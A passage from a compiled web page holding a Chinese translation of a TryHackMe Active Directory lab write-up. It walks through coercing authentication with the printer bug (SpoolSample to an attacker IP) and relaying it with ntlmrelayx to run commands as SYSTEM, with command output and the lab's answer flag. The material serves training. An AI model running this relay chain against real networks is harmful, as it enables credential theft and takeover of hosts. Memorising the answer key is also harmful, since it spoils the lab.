\u623f\u95f4\u4e2d\u6240\u5c55\u793a\u7684\uff0c\u5982\u679c\u6211\u4eec\u5e78\u8fd0\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u622a\u53d6\u5176\u4e2d\u4e00\u4e9b\u6311\u6218\u4ee5\u83b7\u53d6\u8bbf\u95ee\u6743\u9650\u3002\u4f46\u5982\u679c\u6211\u4eec\u4e0d\u60f3\u7b49\u5f85\u5462\uff1f\u5982\u679c\u6211\u4eec\u80fd\u5f3a\u8feb\u8fdb\u884c\u8ba4\u8bc1\u5462\uff1f"}),"\n",(0,r.jsx)(n.p,{children:"\u5c3d\u7ba1\u6211\u4eec\u5df2\u7ecf\u5bf9 THMSERVER1 \u62e5\u6709\u4e86\u7279\u6743\u8bbf\u95ee\u6743\u9650\uff0c\u4f46\u6211\u4eec\u53ef\u80fd\u5904\u4e8e\u65e0\u6cd5\u4f7f\u7528\u53d7\u9650\u59d4\u6d3e\u6f0f\u6d1e\u7684\u4f4d\u7f6e\u3002\u8fd9\u662f\u53e6\u4e00\u4e2a\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u4e3b\u673a\u7279\u6743\u8bbf\u95ee\u6743\u9650\u7684\u7edd\u4f73\u653b\u51fb\u624b\u6bb5\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"machine-\u8d26\u6237",children:"Machine \u8d26\u6237"}),"\n",(0,r.jsx)(n.p,{children:"\u6240\u6709\u7684 Windows \u4e3b\u673a\u90fd\u6709\u4e00\u4e2a\u673a\u5668\u8d26\u6237\u3002\u672c\u8d28\u4e0a\uff0c\u8fd9\u5c31\u662f\u4e0e\u673a\u5668\u5173\u8054\u7684\u7528\u6237\u8d26\u6237\u3002\u9664\u975e\u6709\u4eba\u7be1\u6539\u4e86\u4e3b\u673a\u7684\u8d26\u6237\uff0c\u5426\u5219\u8fd9\u4e9b\u8d26\u6237\u7684\u5bc6\u7801\u662f\u65e0\u6cd5\u7834\u89e3\u7684\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u6709 120 \u4e2a\u5b57\u7b26\uff08UTF16\uff09\u957f\uff0c\u5e76\u4e14\u6bcf 30 \u5929\u81ea\u52a8\u66f4\u6539\u4e00\u6b21\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5728 AD \u4e2d\uff0c\u8fd9\u4e9b\u673a\u5668\u8d26\u6237\u5728\u4e0d\u540c\u7684\u670d\u52a1\u4e2d\u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002\u4e0d\u540c\u7684\u57df\u63a7\u5236\u5668\u4f7f\u7528\u5b83\u4eec\u7684\u673a\u5668\u8d26\u6237\u6765\u540c\u6b65 AD \u7684\u66f4\u65b0\u548c\u66f4\u6539\u3002\u5f53\u4f60\u4ee3\u8868\u4f60\u6b63\u5728\u64cd\u4f5c\u7684\u4e3b\u673a\u8bf7\u6c42\u8bc1\u4e66\u65f6\uff0c\u8be5\u4e3b\u673a\u7684\u673a\u5668\u8d26\u6237\u4f1a\u7528\u4e8e\u8ba4\u8bc1\u5230 AD \u8bc1\u4e66\u670d\u52a1\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5728 AD \u4e2d\u6709\u4e00\u4e2a\u7279\u6b8a\u60c5\u51b5\uff0c\u4e00\u4e2a\u673a\u5668\u5177\u6709\u53e6\u4e00\u53f0\u673a\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\u3002\u672c\u8d28\u4e0a\uff0c\u5728 AD \u914d\u7f6e\u4e2d\uff0c\u53e6\u4e00\u53f0\u4e3b\u673a\u88ab\u6388\u4e88\u4e86\u5bf9\u67d0\u53f0\u4e3b\u673a\u7684\u7ba1\u7406\u6743\u9650\u3002\u540c\u6837\uff0c\u8fd9\u662f\u9884\u671f\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u5fc5\u987b\u540c\u6b65\u7684\u57df\u63a7\u5236\u5668\u6216 SQL \u96c6\u7fa4\u3002\u7136\u800c\uff0c\u8fd9\u4e9b\u60c5\u51b5\u4e3a\u5f3a\u8feb\u8ba4\u8bc1\u63d0\u4f9b\u4e86\u4e00\u4e2a\u975e\u5e38\u6709\u8da3\u7684\u653b\u51fb\u5411\u91cf\u3002"}),"\n",(0,r.jsx)(n.p,{children:'\u6211\u4eec\u9996\u5148\u9700\u8981\u786e\u5b9a\u4e00\u4e2a\u673a\u5668\u8d26\u6237\u662f\u5426\u5177\u6709\u5bf9\u53e6\u4e00\u53f0\u673a\u5668\u7684\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Bloodhound \u6765\u505a\u8fd9\u4ef6\u4e8b\uff0c\u4f46\u8fd9\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u7f16\u5199\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684 Cypher \u67e5\u8be2\u3002\u5728 Bloodhound \u7684 Analysis \u6807\u7b7e\u4e2d\u70b9\u51fb "Create Custom Query"\uff0c\u6211\u4eec\u60f3\u8981\u7f16\u5199\u4ee5\u4e0b\u67e5\u8be2\uff1a'}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u67e5\u8be2\u4f1a\u5c1d\u8bd5\u627e\u5230\u4e00\u4e2a\u8ba1\u7b97\u673a\u5728\u53e6\u4e00\u4e2a\u8ba1\u7b97\u673a\u4e0a\u5177\u6709 \u201cAdminTo\u201d \u5173\u7cfb\u7684\u60c5\u51b5\u3002\u4f60\u5e94\u8be5\u4f1a\u770b\u5230\u7c7b\u4f3c\u4e8e\u8fd9\u6837\u7684\u8f93\u51fa\uff1a"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Bloodhound \u624b\u52a8\u67e5\u8be2",src:i(6765).Z+"",width:"640",height:"284"})})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u975e\u5e38\u6709\u8da3\u3002\u5b83\u663e\u793a\u4e86 THMSERVER2 \u673a\u5668\u8d26\u6237\u5728 THMSERVER1 \u673a\u5668\u4e0a\u5177\u6709\u7ba1\u7406\u6743\u9650\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"the-printer-bug---\u6253\u5370\u673a\u9519\u8bef",children:"The Printer Bug - \u6253\u5370\u673a\u9519\u8bef"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u201c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u800c\u662f\u4e00\u4e2a\u529f\u80fd\u201d \u2014 \u5fae\u8f6f"}),"\n",(0,r.jsx)(n.p,{children:"It's not a bug, it's a feature - Microsoft."}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4e25\u8083\u5730\u8bf4\uff0c\u5f53\u8fd9\u4e2a\u95ee\u9898\u88ab\u62a5\u544a\u65f6\uff0c\u5fae\u8f6f\u56de\u5e94\u79f0\u8fd9\u662f\u4e00\u4e2a\u529f\u80fd\u3002\u6253\u5370\u673a\u6f0f\u6d1e\u662f MS-RPRN \u534f\u8bae\uff08\u6253\u5370\u7cfb\u7edf\u8fdc\u7a0b\u534f\u8bae\uff09\u7684 \u201c\u529f\u80fd\u201d\uff0c\u5b83\u5141\u8bb8\u57df\u7528\u6237\u8fdc\u7a0b\u5f3a\u5236\u76ee\u6807\u4e3b\u673a\u4e0a\u8fd0\u884c\u6253\u5370\u6c60\u670d\u52a1\u7684\u8ba1\u7b97\u673a\u8d26\u6237\u5bf9\u4efb\u610f IP \u5730\u5740\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5728\u6700\u8fd1\u51e0\u5e74\u4e2d\u51fa\u73b0\u4e86\u51e0\u4e2a\u7c7b\u4f3c\u7684\u6f0f\u6d1e\uff1aSpooler\u3001PetitPotam\u3001PrintNightmare\u3002\u5fae\u8f6f\u58f0\u79f0\uff0c\u552f\u4e00\u7684\u95ee\u9898\u662f\u5176\u4e2d\u4e00\u4e9b\u6839\u672c\u4e0d\u9700\u8981 AD \u51ed\u636e\uff0c\u4f46\u8fd9\u4e2a\u95ee\u9898\u5df2\u7ecf\u901a\u8fc7\u5b89\u5168\u8865\u4e01\u89e3\u51b3\u4e86\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u56e0\u6b64\uff0c\u8981\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u9664\u4e86\u673a\u5668\u8d26\u6237\u7684\u7ba1\u7406\u6743\u9650\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u56db\u4e2a\u6761\u4ef6\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u6709\u6548\u7684 AD \u8d26\u6237\u51ed\u636e\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u8fde\u63a5\u5230\u76ee\u6807 SMB \u670d\u52a1\u7684\u7f51\u7edc\u8fde\u63a5\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u76ee\u6807\u4e3b\u673a\u5fc5\u987b\u8fd0\u884c\u6253\u5370\u6c60\u670d\u52a1\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u4e3b\u673a\u4e0d\u80fd\u5f3a\u5236\u4f7f\u7528 SMB \u7b7e\u540d\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u6761\u4ef6 1 \u548c 2 \u5df2\u7ecf\u6ee1\u8db3\u3002\u6211\u4eec\u9700\u8981\u786e\u4fdd\u5de5\u4f5c\u7684\u662f\u6761\u4ef6 3 \u548c 4\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"print-spooler-service---\u6253\u5370\u540e\u53f0\u5904\u7406\u670d\u52a1",children:"Print Spooler Service - \u6253\u5370\u540e\u53f0\u5904\u7406\u670d\u52a1"}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u9700\u8981\u786e\u5b9a\u6253\u5370\u6c60\u670d\u52a1\u662f\u5426\u6b63\u5728\u8fd0\u884c\u3002\u7531\u4e8e\u6211\u4eec\u65e0\u6cd5\u8bbf\u95ee THMSERVER2\uff0c\u6211\u4eec\u9700\u8981\u4ece\u7f51\u7edc\u89d2\u5ea6\u8fdb\u884c\u67e5\u8be2\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 SSH \u4f1a\u8bdd\u5728 THMWRK1 \u4e0a\u8fdb\u884c WMI \u67e5\u8be2\u6765\u67e5\u8be2\u670d\u52a1\u7684\u5f53\u524d\u72b6\u6001\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="powershell"',children:"PS C:\\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc\n\n\nLocation      :\nName          : Microsoft XPS Document Writer\nPrinterState  : 0\nPrinterStatus : 3\nShareName     :\nSystemName    : THMSERVER2\n\nLocation      :\nName          : Microsoft Print to PDF\nPrinterState  : 0\nPrinterStatus : 3\nShareName     :\nSystemName    : THMSERVER2\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\u8bc1\u5b9e\u4e86\u8be5\u670d\u52a1\u6b63\u5728\u8fd0\u884c\u3002\u5982\u679c\u51fa\u73b0\u8bbf\u95ee\u88ab\u62d2\u7edd\u7684\u9519\u8bef\uff0c\u6216\u8bb8\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528 PowerShell \u547d\u4ee4 ",(0,r.jsx)(n.code,{children:"Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc"})," \u3002\u7136\u800c\uff0c\u5fae\u8f6f\u4e00\u76f4\u5728\u9650\u5236\u4ece\u7f51\u7edc\u89d2\u5ea6\u67e5\u770b\u8fd9\u4e9b\u7aef\u53e3\u3002\u5982\u679c\u4e24\u8005\u90fd\u7ed9\u4f60\u9519\u8bef\uff0c\u4e5f\u8bb8\u4f60\u53ea\u9700\u8981\u5192\u9669\u4e00\u8bd5\u3002\u56e0\u6b64\uff0c\u6761\u4ef6\u4e09\u5df2\u7ecf\u6ee1\u8db3\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"smb-signing---smb-\u7b7e\u540d",children:"SMB Signing - SMB \u7b7e\u540d"}),"\n",(0,r.jsx)(n.p,{children:"\u4e3a\u4e86\u4e2d\u7ee7\u5f3a\u8feb\u7684\u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\uff0cSMB \u7b7e\u540d\u4e0d\u5e94\u8be5\u88ab\u5f3a\u5236\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cSMB \u7b7e\u540d\u88ab\u5141\u8bb8\u548c SMB \u7b7e\u540d\u88ab\u5f3a\u5236\u662f\u6709\u533a\u522b\u7684\u3002\u7531\u4e8e\u4e00\u4e9b\u65e7\u7cfb\u7edf\u4e0d\u652f\u6301 SMB \u7b7e\u540d\uff0cSMB \u7684\u9ed8\u8ba4\u914d\u7f6e\u662f\u5141\u8bb8\u7b7e\u540d\u4f46\u4e0d\u5f3a\u5236\u4f7f\u7528\uff0c\u8fd9\u610f\u5473\u7740\u53ea\u6709\u5728\u652f\u6301\u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u4f7f\u7528\u7b7e\u540d\u3002\u7531\u4e8e\u6211\u4eec\u5c06\u6258\u7ba1\u4e00\u4e2a\u6076\u610f\u7684 SMB \u670d\u52a1\u5668\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u4fdd\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0d\u652f\u6301\u7b7e\u540d\uff0c\u4ece\u800c\u5f3a\u8feb\u76ee\u6807\u4e0d\u5bf9 SMB \u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\u8fdb\u884c\u7b7e\u540d\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4e3a\u4e86\u9a8c\u8bc1 THMSERVER1 \u548c THMSERVER2 \u662f\u5426\u6ca1\u6709\u5f3a\u5236\u4f7f\u7528 SMB \u7b7e\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6211\u4eec\u7684 AttackBox \u4e0a\u4f7f\u7528 Nmap\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Terminal"',children:"thm@thm:~# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc\nNmap scan report for distributor.za.tryhackme.loc (172.31.1.201)\nHost is up (0.62s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n\nNmap scan report for 172.31.1.202\nHost is up (0.38s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n\nNmap done: 2 IP addresses (2 hosts up) scanned in 4.59 seconds\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8f93\u51fa\u770b\u5230 SMB \u7b7e\u540d\u5df2\u542f\u7528\u4f46\u672a\u88ab\u5f3a\u5236\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u6240\u6709\u7684\u6761\u4ef6\u90fd\u5df2\u6ee1\u8db3\uff0c\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u653b\u51fb\u4e86\uff01"}),"\n",(0,r.jsx)(n.h3,{id:"exploiting-authentication-relays---\u5229\u7528\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u7ee7",children:"Exploiting Authentication Relays - \u5229\u7528\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u7ee7"}),"\n",(0,r.jsx)(n.admonition,{type:"tip",children:(0,r.jsx)(n.p,{children:"\u8fd9\u79cd\u653b\u51fb\u53ef\u80fd\u4e0d\u7a33\u5b9a\u3002\u6ee5\u7528\u6253\u5370\u6c60\u670d\u52a1\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5176\u5d29\u6e83\uff0c\u5e76\u4e14\u4e0d\u4e00\u5b9a\u80fd\u6536\u5230\u56de\u8c03\u3002\u56e0\u6b64\uff0c\u524d\u9762\u7684\u4efb\u52a1\u5df2\u7ecf\u4e3a\u60a8\u63d0\u4f9b\u4e86\u7ee7\u7eed\u8fdb\u884c\u7684\u5fc5\u8981\u6743\u9650\u3002\u4f46\u662f\uff0c\u7406\u89e3\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u7ee7\u4ee5\u53ca\u5982\u4f55\u5f3a\u5236\u8fdb\u884c\u5b83\u4eec\u5bf9\u4e8e AD \u7684\u5229\u7528\u81f3\u5173\u91cd\u8981\u3002\u56e0\u6b64\uff0c\u4ee5\u4e0b\u63d0\u4f9b\u4e86\u6267\u884c\u6b64\u7c7b\u653b\u51fb\u7684\u6b65\u9aa4\u3002\u60a8\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\uff0c\u4f46\u65e0\u6cd5\u4fdd\u8bc1\u4f1a\u56de\u8c03\u3002\u5982\u679c\u6ca1\u6709\u6210\u529f\uff0c\u8bf7\u7ee7\u7eed\u4e0b\u4e00\u4e2a\u4efb\u52a1\uff0c\u4e5f\u8bb8\u5728\u5b8c\u6210\u60a8\u7684\u623f\u95f4\u65c5\u7a0b\u4e4b\u540e\u518d\u6765\u63a2\u7d22\u8fd9\u4e2a\u95ee\u9898\u3002"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6211\u4eec\u5c06\u4f7f\u7528 ",(0,r.jsx)(n.a,{href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"})," \u6765\u5229\u7528\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u7ee7\u3002\u8fd9\u662f\u4e00\u4e2a C# \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4f46\u5df2\u7ecf\u4e3a\u60a8\u7f16\u8bd1\u5b8c\u6210\uff0c\u5e76\u5b58\u50a8\u5728 THMWRK1 \u7684 ",(0,r.jsx)(n.code,{children:"C:\\Tools\\"})," \u76ee\u5f55\u4e2d\u3002\u6211\u4eec\u5c06\u4f7f\u7528 Spoolsample.exe \u5f3a\u5236 THMSERVER2 \u5411\u6211\u4eec\u7684 AttackBox \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u7136\u540e\u4f7f\u7528 ",(0,r.jsx)(n.a,{href:"https://github.com/fortra/impacket",children:"Impacket"})," \u7684 ",(0,r.jsx)(n.a,{href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"})," \u6765\u4e2d\u7ee7\u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\u5230 THMSERVER1\u3002\u8bf7\u6ce8\u610f\uff0c\u5982\u679c\u60a8\u6b63\u5728\u4f7f\u7528\u81ea\u5df1\u7684\u865a\u62df\u673a\uff0c\u60a8\u9700\u8981\u786e\u4fdd\u62e5\u6709\u652f\u6301 SMBv2 \u7684\u6700\u65b0\u7248\u672c\u7684 Impacket\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u7b2c\u4e00\u6b65\u662f\u8bbe\u7f6e NTLM \u4e2d\u7ee7\u3002\u5728\u6211\u4eec\u7684 AttackBox \u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Terminal"',children:'thm@thm:~# python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u6211\u4eec\u6307\u5b9a\u7684\u662f THMSERVER1 \u7684\u4e3b\u673a\u540d\u800c\u4e0d\u662f IP\uff0c\u4e3b\u673a\u53ef\u80fd\u4f1a\u8981\u6c42\u6211\u4eec\u4f7f\u7528 Kerberos \u8eab\u4efd\u9a8c\u8bc1\u800c\u4e0d\u662f NTLM\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5e94\u8be5\u6307\u5b9a IP\u3002\u901a\u8fc7\u4fa6\u542c\u4e2d\u7ee7\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u5f3a\u5236 THMSERVER2 \u5bf9\u6211\u4eec\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5728 THMWRK1 \u7684 SSH \u7ec8\u7aef\u4e0a\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Terminal"',children:'C:\\Tools\\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u4f60\u7684\u653b\u51fb\u8005 IP \u5e94\u8be5\u4e0e\u4f60\u7684 tunX \u63a5\u53e3\u5bf9\u5e94\u4e8e\u8be5\u7f51\u7edc\u3002\u5982\u679c\u4e00\u5207\u987a\u5229\uff0c\u4f60\u5e94\u8be5\u5df2\u7ecf\u6536\u5230\u4e86\u4e00\u4e2a\u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\u5e76\u4e14\u6210\u529f\u4e2d\u7ee7\u5230\u4e86 THMSERVER1\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Terminal"',children:"thm$ python3.9 ntlmrelayx.py -smb2support -t smb://\"THMSERVER1 IP\" -c 'whoami /all' -debug\n[*] Servers started, waiting for connections\n[*] SMBD-Thread-5: Received connection from 172.31.1.202, attacking target smb://172.31.1.201\n[*] Authenticating against smb://172.31.1.201 as ZA/THMSERVER2$ SUCCEED\n[+] No more targets\n[*] SMBD-Thread-7: Connection from 172.31.1.202 controlled, but there are no more targets left!\n[+] No more targets\n[*] SMBD-Thread-8: Connection from 172.31.1.202 controlled, but there are no more targets left!\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[+] ExecuteRemote command: %COMSPEC% /Q /c echo whoami /all ^> %SYSTEMROOT%\\Temp\\__output > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\n[*] Executed specified command on host: 172.31.1.201\n\nUSER INFORMATION\n----------------\n\nUser Name           SID\n=================== ========\nnt authority\\system S-1-5-18\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID          Attributes\n====================================== ================ ============ ==================================================\nBUILTIN\\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner\nEveryone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nMandatory Label\\System Mandatory Level Label            S-1-16-16384\n[...]\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u8f93\u51fa\u7c7b\u4f3c\u4e8e\u4f7f\u7528\u4e86 ",(0,r.jsx)(n.code,{children:"-c 'whoami /all'"})," \u547d\u4ee4\u7684\u60c5\u51b5\u3002\u7136\u800c\uff0c\u901a\u8fc7\u4e0d\u6307\u5b9a\u547d\u4ee4\uff0c\u4f60\u73b0\u5728\u5df2\u7ecf\u6267\u884c\u4e86\u4e00\u4e2a\u54c8\u5e0c\u8f6c\u50a8\u3002\u8fd9\u4e9b\u51ed\u636e\u73b0\u5728\u53ef\u4ee5\u7528\u6765\u5728\u4e3b\u673a\u4e0a\u83b7\u53d6\u4e00\u4e2a Shell\uff01"]}),"\n",(0,r.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,r.jsx)(n.p,{children:"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWindows \u8ba1\u7b97\u673a\u5e10\u6237\u7684\u5bc6\u7801\u591a\u4e45\u8f6e\u6362\u4e00\u6b21\uff08\u4ee5\u5929\u4e3a\u5355\u4f4d\uff09\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"30\n"})}),(0,r.jsx)(n.p,{children:"\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e2d\u7ee7 SMB \u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\uff0c\u4e0d\u5e94\u8be5\u5f3a\u5236\u6267\u884c\u54ea\u4e9b\u64cd\u4f5c\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"SMB Signing\n"})}),(0,r.jsx)(n.p,{children:"THMSERVER1 \u4e0a Administrator.ZA \u7528\u6237\u7684\u684c\u9762\u76ee\u5f55\u4e2d\u5b58\u50a8\u7684\u6807\u5fd7\u7684\u503c\u662f\u591a\u5c11 (flag3.txt)\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"THM{Printing.Some.Shellz}\n"})})]}),"\n",(0,r.jsx)(n.h2,{id:"exploiting-ad-users---\u5229\u7528-ad-\u7528\u6237",children:"Exploiting AD Users - \u5229\u7528 AD \u7528\u6237"}),"\n",(0,r.jsx)(n.p,{children:"\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5728\u5229\u7528\u65b9\u9762\u5df2\u7ecf\u53d6\u5f97\u4e86\u76f8\u5f53\u5927\u7684\u8fdb\u5c55\u3002\u6211\u4eec\u5bf9\u5de5\u4f5c\u7ad9\u548c\u670d\u52a1\u5668\u62e5\u6709\u5b8c\u5168\u7684\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u3002\u57fa\u672c\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u51e0\u4e4e\u4efb\u4f55\u4e00\u53f0\u4e00\u7ea7\u548c\u4e8c\u7ea7\u7cfb\u7edf\u8fdb\u884c\u540e\u671f\u5229\u7528\u3002\u4f46\u6211\u4eec\u8fd8\u60f3\u66f4\u8fdb\u4e00\u6b65\u3002\u63a5\u4e0b\u6765\u7684\u4efb\u52a1\u4e5f\u53ef\u4ee5\u770b\u4f5c\u662f\u540e\u671f\u5229\u7528\uff0c\u4f46\u5728\u6211\u4eec\u4ecd\u5728\u6267\u884c\u5229\u7528\u4ee5\u8fbe\u5230\u6267\u884c\u76ee\u6807\u4f4d\u7f6e\u65f6\uff0c\u901a\u5e38\u662f\u4e00\u4e2a\u6781\u597d\u7684\u9009\u62e9\u3002\u73b0\u5728\u662f\u65f6\u5019\u9488\u5bf9 AD \u7528\u6237\u5c55\u5f00\u653b\u51fb\u4e86\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u7528\u6237\u548c\u7528\u6237\u884c\u4e3a",children:"\u7528\u6237\u548c\u7528\u6237\u884c\u4e3a"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u672a\u6765\u7684\u5de5\u5382\u53ea\u4f1a\u6709\u4e24\u540d\u5458\u5de5\uff1a\u4e00\u4e2a\u4eba\u548c\u4e00\u53ea\u72d7\u3002\u4eba\u7684\u5b58\u5728\u662f\u4e3a\u4e86\u5582\u72d7\uff0c\u800c\u72d7\u5219\u662f\u4e3a\u4e86\u5728\u4eba\u8bd5\u56fe\u89e6\u78b0\u4efb\u4f55\u4e1c\u897f\u65f6\u54ac\u4eba\u3002- \u6c83\u4f26 \xb7 \u672c\u5c3c\u65af"}),"\n",(0,r.jsx)(n.p,{children:"The factory of the future will only have two employees. A human and a dog. The human will be there to feed the dog. The dog will be there to bite the human if they try to touch something. - Warren Bennis"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u7528\u6237\u5f80\u5f80\u662f\u5b89\u5168\u94fe\u6761\u4e2d\u6700\u8584\u5f31\u7684\u73af\u8282\u3002\u60f3\u60f3\u5f31\u5bc6\u7801\u548c\u4e0d\u826f\u4e60\u60ef\uff0c\u6bd4\u5982\u6388\u4e88\u8fc7\u4e8e\u5bbd\u677e\u7684\u6743\u9650\u3002\u5ffd\u89c6\u8fd9\u4e2a\u653b\u51fb\u9762\u662f\u611a\u6627\u548c\u65e0\u6548\u7684\u3002\u867d\u7136\u5efa\u7acb\u5408\u9002\u7684 AD \u7528\u6237\u679a\u4e3e\u548c\u653b\u51fb\u65b9\u6cd5\u662f\u6709\u76ca\u7684\uff0c\u4f46\u5728\u8fd9\u4e2a\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u4e13\u6ce8\u4e8e\u4e24\u4e2a\u8981\u7d20\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u51ed\u8bc1\u7ba1\u7406 - \u7528\u6237\u5982\u4f55\u5b58\u50a8\u4ed6\u4eec\u7684\u51ed\u8bc1\u3002\u5728 AD 